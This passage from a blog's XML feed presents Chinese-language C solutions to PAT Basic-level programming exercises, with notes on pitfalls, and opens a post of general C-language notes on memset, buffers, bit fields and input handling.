class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i*n+j]);</span><br><span class="line"><span class="keyword">if</span>(j != n<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1051-复数乘法"><a href="#1051-复数乘法" class="headerlink" title="1051 复数乘法"></a>1051 复数乘法</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200730104434939.png" alt="image-20200730104434939"></p><p>为什么PAT的题有这么多坑。。首先这里的给的辐角已经是弧度制了，所以不用转换；其次就是结果保留2位小数，那当结果小于0但大于-0.01时，比如-0.001，这时候保留2位小数就只有0，所以最后输出的时候也不应该有负号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> r1 = <span class="number">0</span>, p1 = <span class="number">0</span>, r2 = <span class="number">0</span>, p2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> a1 = <span class="number">0</span>, b1 = <span class="number">0</span>, a2 = <span class="number">0</span>, b2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> ans1 = <span class="number">0</span>, ans2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf %lf %lf %lf"</span>, &amp;r1, &amp;p1, &amp;r2, &amp;p2);</span><br><span class="line">a1 = r1*<span class="built_in">cos</span>(p1);</span><br><span class="line">b1 = r1*<span class="built_in">sin</span>(p1);</span><br><span class="line">a2 = r2*<span class="built_in">cos</span>(p2);</span><br><span class="line">b2 = r2*<span class="built_in">sin</span>(p2);</span><br><span class="line">ans1 = a1*a2+(<span class="number">-1</span>)*b1*b2;</span><br><span class="line">ans2 = a1*b2+a2*b1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans1 &lt; <span class="number">0</span> &amp;&amp; ans1 &gt; <span class="number">-0.01</span>)</span><br><span class="line">ans1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ans2 &lt; <span class="number">0</span> &amp;&amp; ans2 &gt; <span class="number">-0.01</span>)</span><br><span class="line">ans2 = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>, ans1);</span><br><span class="line"><span class="keyword">if</span>(ans2 &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'+'</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lfi"</span>, ans2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1052-卖个萌"><a href="#1052-卖个萌" class="headerlink" title="1052 卖个萌"></a>1052 卖个萌</h3><p><strong>考点：字符串的分割，使用一个指针数组来存储地址。</strong></p><p>写完，在本地C语言环境发现VC与DEVC一得不到正确的结果，调式才发现这2个环境都不能识别输入的表情符号，然后都以0来填充。这也是本题我的难点，找错半天。。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200731114402392.png" alt="image-20200731114402392"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *a[], <span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(s[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'['</span>)</span><br><span class="line">a[j++] = s+i+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">']'</span>)</span><br><span class="line">s[i] = <span class="string">'\0'</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *a[<span class="number">3</span>][<span class="number">100</span>] = &#123;<span class="literal">NULL</span>&#125;, s[<span class="number">3</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> zs, zy, k, yy, ys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gets(s[i]);</span><br><span class="line">fun(a[i], s[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d %d"</span>, &amp;zs, &amp;zy, &amp;k, &amp;yy, &amp;ys);</span><br><span class="line"><span class="keyword">if</span>(!a[<span class="number">0</span>][zs<span class="number">-1</span>] || !a[<span class="number">0</span>][ys--] || !a[<span class="number">1</span>][zy<span class="number">-1</span>] || !a[<span class="number">1</span>][yy<span class="number">-1</span>] || !a[<span class="number">2</span>][k])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Are you kidding me? @\\/@\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s%s%s%s%s"</span>, a[<span class="number">0</span>][zs<span class="number">-1</span>], a[<span class="number">1</span>][zy<span class="number">-1</span>], a[<span class="number">2</span>][k], a[<span class="number">1</span>][yy<span class="number">-1</span>], a[<span class="number">0</span>][ys<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后：还有一个注意的地方就是，使用指针数组存放一个数组的指针字符串的地址后，该数组不能改变啊。大意就容易出错。</p><h3 id="1054-求平均值"><a href="#1054-求平均值" class="headerlink" title="1054 求平均值"></a>1054 求平均值</h3><p>这个题开始自己了判断是否是合法数据的函数，但一只有一个测试点过不了，就开始找判断函数的问题，果然有问题，但修改后仍然有测试点过不了。</p><p>原来因为题不中的一句话：如果 <code>K</code> 为 1，则输出 <code>The average of 1 number is Y</code>，这里的number是单数。。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200805103116143.png" alt="image-20200805103116143"></p><p>另外就是这个题，直接用sscanf与sprintf对数据进行相互转换，如果不相等则不合法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;, t[<span class="number">1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, count = <span class="number">0</span>, i = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> sum = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sscanf</span>(s, <span class="string">"%lf"</span>, &amp;temp);</span><br><span class="line"><span class="built_in">sprintf</span>(t, <span class="string">"%.2lf"</span>, temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line"><span class="keyword">if</span>(s[i] != t[i])</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(!flag &amp;&amp; temp &gt;= <span class="number">-1000</span> &amp;&amp; temp &lt;= <span class="number">1000</span>)</span><br><span class="line">sum += temp, count++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: %s is not a legal number\n"</span>, s);</span><br><span class="line"><span class="built_in">strcpy</span>(s, <span class="string">""</span>), flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The average of 1 number is %.2lf"</span>, sum/count);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(count)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The average of %d numbers is %.2lf"</span>, count, sum/count);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The average of 0 numbers is Undefined"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1060-爱丁顿数"><a href="#1060-爱丁顿数" class="headerlink" title="1060 爱丁顿数"></a>1060 爱丁顿数</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200808093106281.png" alt="image-20200808093106281"></p><p>难在题目意思开始没有理解。其实就是让我们找到给定骑车天数中，E天骑车超过E英里的最大E。如给定的例子，在给定10天骑车中，有6天骑车都超过6英里。且这个6是能找到最大的。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200808093430888.png" alt="image-20200808093430888"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)a &gt; *(<span class="keyword">int</span> *)b ? <span class="number">-1</span>:<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i = <span class="number">1</span>, a[<span class="number">100001</span>], ans = <span class="number">0</span>, p = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line">qsort(a+<span class="number">1</span>, n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(ans &lt;= n &amp;&amp; a[p] &gt; p)</span><br><span class="line">ans++, p++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1062-最简分数"><a href="#1062-最简分数" class="headerlink" title="1062 最简分数"></a>1062 最简分数</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200810094130936.png" alt="image-20200810094130936"></p><p>就是上面的一个坑点。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a%b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, count = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> a, a1, b, b1;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf/%lf %lf/%lf %d"</span>, &amp;a, &amp;a1, &amp;b, &amp;b1, &amp;k);</span><br><span class="line">a *= k/a1, b *= k/b1;</span><br><span class="line"><span class="keyword">if</span>(a &gt; b)</span><br><span class="line">swap(&amp;a, &amp;b);</span><br><span class="line">b = b&gt;(<span class="keyword">int</span>)b ? b+<span class="number">1</span>:b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = (<span class="keyword">int</span>)a+<span class="number">1</span>; i &lt; (<span class="keyword">int</span>)b; i++)</span><br><span class="line"><span class="keyword">if</span>(gcd(i, k) == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d/%d"</span>, i, k), count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d/%d"</span>, i, k);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1065-单身狗"><a href="#1065-单身狗" class="headerlink" title="1065 单身狗"></a>1065 单身狗</h3><p>真的吐了，又是被PAT乙级输出格式找了半天错。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200813103816746.png" alt="image-20200813103816746"></p><p>另外就是，还是0作怪。。我用0做存放夫妻数组的初始化，让夫妻达到相互映射关系，但是忘了有夫妻的id是0啊。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, count = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100000</span>], b[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id1, id2;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;id1, &amp;id2);</span><br><span class="line">a[id1] = id2, a[id2] = id1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;id);</span><br><span class="line">b[id]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(b[i] &amp;&amp; (a[i] &lt; <span class="number">0</span> || !b[a[i]]))</span><br><span class="line">count++, b[i] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(b[i] == <span class="number">-1</span> &amp;&amp; count &gt; <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d "</span>, i), count--;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(b[i] == <span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%05d"</span>, i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C语言学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言一些总结</title>
      <link href="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
      <url>/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="关于memset赋初值"><a href="#关于memset赋初值" class="headerlink" title="关于memset赋初值"></a>关于memset赋初值</h2><ul><li><p>一般我们使用memset都是赋值0作为初始化值，但不能赋值非0嘛？其实是可以的，但仅限于对像字符数组那样的单字节数据。</p></li><li><p>因为memset是以字节为单位进行一个字节一个字节进行填充的。<a id="more"></a></p></li></ul><hr><h2 id="一个优先级问题"><a href="#一个优先级问题" class="headerlink" title="一个优先级问题"></a>一个优先级问题</h2><ul><li><p>在刚学指针时写了 <code>while(c = *(p++)  != &#39;\0&#39;)</code>，但是一直得不到自己想要的结果。</p></li><li><p>原因在于这里 <code>!=</code> 的优先级大于 <code>=</code>， 所以先执行了 <code>*(p++)  != &#39;\0&#39;</code>，而这个的结果是以一个boolean值，只有2种结果 0 或 1。</p></li><li><p>故c = 1 或 0 了。</p></li></ul><hr><h2 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h2><p>一：什么是缓冲区？</p><ul><li>缓冲区又称为缓存，它是内存空间的一部分。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。</li><li>缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。</li></ul><p>二：为什么要引入缓冲区？</p><ul><li>比如我们从磁盘里取信息，我们先把读出的数据放在缓冲区，计算机再直接从缓冲区中取数据，等缓冲区的数据取完后再去磁盘中读取，这样就可以减少磁盘的读写次数，再加上计算机对缓冲区的操作大大快于对磁盘的操作，故应用缓冲区可大大提高计算机的运行速度。</li><li>又比如，我们使用打印机打印文档，由于打印机的打印速度相对较慢，我们先把文档输出到打印机相应的缓冲区，打印机再自行逐步打印，这时我们的CPU可以处理别的事情。</li><li>缓冲区就是一块内存区，它用在输入输出设备和CPU之间，用来缓存数据。它使得低速的输入输出设备和高速的CPU能够协调工作，避免低速的输入输出设备占用CPU，解放出CPU，使其能够高效率工作。</li></ul><p>三：缓冲区的类型。</p><p>区分为三种类型：全缓冲、行缓冲和不带缓冲。</p><ul><li><p>全缓冲</p><p>在这种情况下，当填满标准I/O缓存后才进行实际I/O操作。全缓冲的典型代表是对磁盘文件的读写。</p></li><li><p>行缓冲</p><p>在这种情况下，当在输入和输出中遇到换行符时，执行真正的I/O操作。这时，我们输入的字符先存放在缓冲区，等按下回车键换行时才进行实际的I/O操作。典型代表是键盘输入数据。</p></li><li><p>不带缓冲</p><p>也就是不进行缓冲，标准出错情况stderr是典型代表，这使得出错信息可以直接尽快地显示出来。</p></li></ul><p>四：刷新缓冲区</p><ul><li>在我们C语言文件操作中使用 <code>fclose()</code>函数就有那种作用。</li></ul><hr><h2 id="关于联合位域，小端"><a href="#关于联合位域，小端" class="headerlink" title="关于联合位域，小端"></a>关于联合位域，小端</h2><ul><li><p>在一般的我们平常使用的计算机, 数据存储方式都是小端, 但是C语言编译器都会经过处理, 所以总是按一个类型, 倒序显示。</p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200426080918889-1590480458990-1590662951683.png" alt="image-20200426080918889-1590480458990"></p><p><img src="/2019/11/17/C%E8%AF%AD%E8%A8%80%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/image-20200426080956374-1590480458991-1590662970168.png" alt="image-20200426080956374-1590480458991"></p></li><li><p>从以上两个图片可以看出, 当结构体中位域定义时. 是从左往右一个字节一个字节进行定义, 在一个字节中也是从低位bit0 开始算起的(注意不是从高位开始对应)。</p></li><li><p>如上图中 test.year = 0x655, year有12位. 但是在多出的4位中, 06在该字节的低位, test.month = 0x4在该字节的高位。</p></li><li><p>当相邻成员的类型相同时，如果它们的位宽之和小于类型的 sizeof 大小，那么后面的成员紧邻前一个成员存储，直到不能容纳为止；如果它们的位宽之和大于类型的 sizeof 大小，那么后面的成员将从新的存储单元开始，其偏移量为类型大小的整数倍。 若不是同类型, 则不会, 注意(int 与 short int)也是不同类型.。</p></li></ul><hr><h2 id="二维数组形参问题"><a href="#二维数组形参问题" class="headerlink" title="二维数组形参问题"></a>二维数组形参问题</h2><ul><li>当二维数组作为参数传递给函数时，函数的形参不能简单地写双重指针。</li><li>因为编译器实际寻址如下：对于数组 int p[m][n];如果要取p[i][j]的值，编译器是这样寻址的：p + i*n + j; 如果我们省略了第二维或者更高维的大小，编译器将不知道如何正确的寻址。因此如果我们在编写程序的时候需要用到各个维数都不固定的二维数组作为参数，虽然这个时候编译器还是不能识别。</li><li>我们可以把二维数组当做普通的指针，将它的大小用两个参数指明，然后我们为二维数组手工寻址，这样就可以将二维数组作为函数的参数传递了，我们可以把维数固定的参数变为维数随即的参数。</li></ul><hr><h2 id="需要用getchar-吃掉回车的情况"><a href="#需要用getchar-吃掉回车的情况" class="headerlink" title="需要用getchar()吃掉回车的情况"></a>需要用getchar()吃掉回车的情况</h2><ol><li>接受字符或字符串的前面有<code>scanf()</code>语句。</li><li>连续使用2个<code>getchar()</code>接受字符时，中间要使用一个<code>getchar()</code>吃掉回车。</li><li>scanf()；后如果是是用gets()输入字符串，那必须先吃掉回车；如果是用scanf(“%s”, )；输入字符串可以不吃掉回车。</li></ol><p><strong>注意：<code>gets()</code>后面是不需要吃掉回车的，因为它把回车转化为了字符串最后的 ‘\0’ 。</strong></p><hr><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><ul><li><p>对于文件写入方式主要还是与使用的函数有关，与打开方式关系不大。</p></li><li><p>文本形式写入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span 